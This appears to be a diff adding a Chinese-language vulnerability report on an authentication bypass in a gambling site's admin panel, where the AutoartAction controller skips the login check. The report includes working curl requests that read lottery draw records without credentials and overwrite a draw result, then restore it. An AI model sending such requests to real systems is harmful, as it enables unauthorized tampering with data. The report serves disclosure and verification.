@@ -1,0 +1,19 @@
+## 现象
+- `GET /index.php?g=Admin&m=Admin&a=kjer` 类请求中，`m=Autoart` 零 Cookie 返回 200 后台框架页 + 真实数据；同组 `m=User/Main/System/Admin/Article/Payorder/Block/Daikuan` 全部 302 → `/index.php?g=Admin&m=Index&a=login`。
+- Autoart 可用 action：kjer / kjer1 / kjerhk / kjer_new / index / indexam / catlist / editkjer / del / add / addcat / clearcache / logout。
+- 写点：`POST a=editkjer&id=<id>` 回显「编辑成功!」，页面 trace 显示 `1 queries 1 writes`；`POST a=article_save`（ids=8_54）返回生成条数。
+- 读点：kjer 开奖记录（期号/码数/特码/生肖/波色）、indexam 帖子（作者/单价/销量）。
+
+## 根因
+`/App/Lib/Action/Admin/AutoartAction.class.php` 里 `class AutoartAction extends Action`，未继承 `CommonAction`，因此 `CommonAction::_initialize()` 的登录/Host 白名单校验整段被跳过。同站 Wechat 控制器同型。
+
+## 复现三件套
+1. `curl -k --noproxy '*' "https://192.0.2.2/index.php?g=Admin&m=Autoart&a=kjer"` → 200/88964B，`<title>开奖管理 - 管理系统</title>`
+2. `curl -k --noproxy '*' -X POST "https://192.0.2.2/index.php?g=Admin&m=Autoart&a=editkjer&id=6101" -d "expect=9996048&openTime=2026-10-29 02:30:00&type=8&openCode=01,02,03,04,05,06,07&zodiac=马&wave=red&topenCode=44&tzodiac=马&twave=red"` → 200「编辑成功!」，回读 topenCode=44
+3. 复原：同请求 `topenCode=07`，读回 07（零副作用验证/回滚）
+
+## 证伪条件
+若带/不带 Cookie 的 kjer 响应完全一致且不含业务数据，或同组全部 Admin 控制器都 200，则判断不成立。实测两者均不成立。
+
+## 影响
+零凭证读写博彩站核心开奖数据（可篡改开奖结果），并可作为读取 App/Conf/config.db.php 等配置、进一步拿后台凭据/RCE 的立足点。
